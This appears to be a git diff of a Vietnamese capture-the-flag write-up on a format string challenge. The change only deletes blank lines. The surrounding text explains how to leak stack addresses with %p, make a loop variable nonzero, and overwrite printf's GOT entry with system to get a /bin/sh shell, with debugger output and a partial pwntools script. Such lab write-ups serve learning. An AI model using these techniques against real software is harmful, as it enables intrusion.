@@ -18,9 +18,6 @@ Ta có thể thấy rằng đây là bài Partial RELRO, và NX được bật, 
 └─$ ./yet_another_fsb
 ABC
 ABC
-
-
-
 ```
 
 ```
@@ -48,14 +45,11 @@ undefined8 main(void)
   } while (i != 0);
   return 0;
 }
-
-
 ```
 
 À há, đúng như dự đoán, bài toán này có lỗ hổng Format String, kết hợp với Checksec chỉ bật `Partial Relro`, ý tưởng là như sau: Thay thế GOT của hàm `printf` thành `system` và tiến hành gọi `/bin/sh`. Hàm `printf` nhận đầu vào `input` và đưa vào thanh ghi `rdi`, từ đó ta có thể nhập chuỗi `/bin/sh` vào và chuỗi đó sẽ được đưa vào thanh ghi `rdi`. Lần sau khi gọi `printf` thì nó sẽ gọi `system('/bin/sh')`. Nhưng, có 1 vấn đề rất lớn mà chúng ta phải đối mặt, biến i được khai báo với giá trị là 0, nhưng vòng while chỉ thực hiện khi `(i != 0)`, nói cách khác. Vòng lặp này chỉ thực hiện 1 lần, cho nên việc mà ta có thể vừa `leak` địa chỉ, vừa `overwrite` GOT của hàm `printf` là không thể. Đó là lúc chúng ta cần phải nghĩ theo 1 hướng: đó là thay đổi giá trị biến `i` sao cho nó khác 0, từ đó tạo ra vòng lặp vô hạn -> từ đây thì có rất nhiều cách để khai thác rồi. Cùng debug để xem nào.
 
 ```
-
 pwndbg> disass main
 Dump of assembler code for function main:
    0x00000000004011a7 <+0>:     push   rbp
@@ -80,7 +74,6 @@ Dump of assembler code for function main:
    0x00000000004011fd <+86>:    leave
    0x00000000004011fe <+87>:    ret
 End of assembler dump.
-
 ```
 
 Dòng `mov    WORD PTR [rbp-0x2],0x0` gán giá trị của `rbp -  0x2` thành `0x0`. Khả năng cao đây là biến i, cùng đặt breakpoint ở đây và xem nào.
@@ -144,8 +137,6 @@ LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
 ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 pwndbg> x/xg $rbp-0x2
 0x7fffffffdbfe: 0x7fffffffdca00000
-
-
 ```
 
 Vậy địa chỉ của `rbp-0x2` (hay là biến `i`) thì đang có địa chỉ là `0x7fffffffdbfe`, nhưng khi ta chạy lần khác thì địa chỉ lúc này lại khác. Nguyên nhân là do ASLR được bật trên stack:
@@ -158,7 +149,6 @@ pwndbg> x/xg $rbp-0x2
 Vậy ta có thể tìm 1 địa chỉ nào trên stack gần giống với địa chỉ biến `i` này, cùng thử từng index nào.
 
 ```
-
 %p %p %p %p %p %p %p %p
 0x7fffffffd860 0xff 0x7ffff7edd981 (nil) 0x7ffff7fcdf40 0x7025207025207025 0x2520702520702520 0xa70252070252070
 ```
@@ -295,8 +285,6 @@ print_address = e.got['printf']
 system = libc.address + 0x50f10
 info("Printf address: %#x", print_address)
 info("SYstem address: %#x", system)
-
-
 ```
 
 Ta cần tìm địa chỉ system để sau gọi `system('/bin/sh')`. Muốn có được offset của system thì có thể lấy địa chỉ system trên stack hiện tại - cho libc hiện.
